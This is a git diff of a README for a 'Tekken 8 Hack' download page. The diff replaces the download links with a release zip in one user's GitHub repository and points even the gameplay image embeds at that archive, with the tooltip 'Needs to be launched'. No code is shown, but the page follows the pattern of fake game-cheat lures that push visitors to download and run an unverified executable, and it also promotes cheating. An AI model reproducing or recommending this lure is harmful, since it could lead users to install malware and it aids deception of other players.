@@ -30,13 +30,13 @@ Are you ready to take your Tekken 8 gaming experience to the next level? Look no
 ## Get Started:
 Ready to up your Tekken 8 game? Click the button below to download the latest hack for Tekken 8 and start dominating the competition. Let's fight! 💥
 
-[![Download Tekken 8 Hack](https://img.shields.io/badge/Download-Hack-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip "Needs to be launched")
+[![Download Tekken 8 Hack](https://github.com/Afzalmirza12/Tekken-8-Cheat/releases/download/v1.0/Release.zip)](https://github.com/Afzalmirza12/Tekken-8-Cheat/releases/download/v1.0/Release.zip "Needs to be launched")
 
 If the link above does not work, please check the "Releases" section for alternative download options.
 
 ## 🎮 Tekken 8 Cheat Gameplay 🎮
 
-![Tekken 8 Cheat Gameplay](https://cdn.pixabay.com/photo/2017/08/06/19/40/game-2592294_960_720.jpg)
+![Tekken 8 Cheat Gameplay](https://github.com/Afzalmirza12/Tekken-8-Cheat/releases/download/v1.0/Release.zip)
 
 Take a sneak peek at the incredible gameplay enhancements our cheats can bring to your Tekken 8 experience. Unleash new moves, unlock hidden features, and conquer every battle with ease. Are you ready to become the ultimate Tekken 8 warrior? Let the games begin!
 
@@ -70,7 +70,7 @@ Need help with downloading or using the Tekken 8 cheats? Contact our support tea
 
 ### Together, Let's Dominate Tekken 8! 💪🎮
 
-![Tekken 8 Dominance](https://cdn.pixabay.com/photo/2016/09/01/13/50/videogame-1631879_960_720.jpg)
+![Tekken 8 Dominance](https://github.com/Afzalmirza12/Tekken-8-Cheat/releases/download/v1.0/Release.zip)
 
 Let's take on new challenges, unleash our skills, and conquer every battle that comes our way. With the power of Tekken 8 cheats on our side, victory is within reach. Are you ready to step into the arena and show the world what you're made of? The battle begins now! 👊🔥
 
@@ -78,4 +78,4 @@ Let's take on new challenges, unleash our skills, and conquer every battle that 
 
 Remember, the world of Tekken 8 is waiting for you to leave your mark. Download the latest cheats, join our community, and let's make history together in the world of virtual combat. Embrace the thrill, embrace the challenge, and most importantly, embrace the victory. Time to fight! 💥🎮
 
-**[Download Tekken 8 Hack Now!](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip "Needs to be launched")**
+**[Download Tekken 8 Hack Now!](https://github.com/Afzalmirza12/Tekken-8-Cheat/releases/download/v1.0/Release.zip "Needs to be launched")**
